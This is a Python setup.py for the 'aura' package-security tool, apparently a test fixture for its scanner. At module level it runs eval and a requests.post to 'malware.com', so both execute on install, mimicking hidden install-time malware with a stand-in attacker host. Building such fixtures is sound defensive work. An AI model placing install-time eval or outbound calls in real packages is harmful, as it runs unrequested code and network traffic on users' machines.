#!/usr/bin/env python
import requests
from setuptools import setup

with open("README.md", "r") as fd:
    long_description = fd.read().strip()


with open("requirements.txt", "r") as fd:
    reqs = fd.read().splitlines()

eval('print("Hello malware")')
requests.post("http://malware.com/post")

setup(
    name='aura',
    version='0.1a1',
    description='Security aura for packages',
    long_description=long_description,
    long_description_content_type='text/markdown',
    author='Martin Carnogursky',
    author_email='xcarnog@fi.muni.cz',
    url='https://github.com/RootLUG/aura',
    packages=['aura'],
    install_requires = reqs,
    classifiers=[
        "Development Status :: 3 - Alpha",
        "Intended Audience :: Developers",
        "Intended Audience :: System Administrators",
        "Operating System :: POSIX :: Linux",
        "Programming Language :: Python :: 3.7",
        "Programming Language :: Python :: 3 :: Only",
        "Topic :: Security",
        "License :: OSI Approved :: GNU General Public License v3 (GPLv3)"
    ],
    zip_safe=False
)
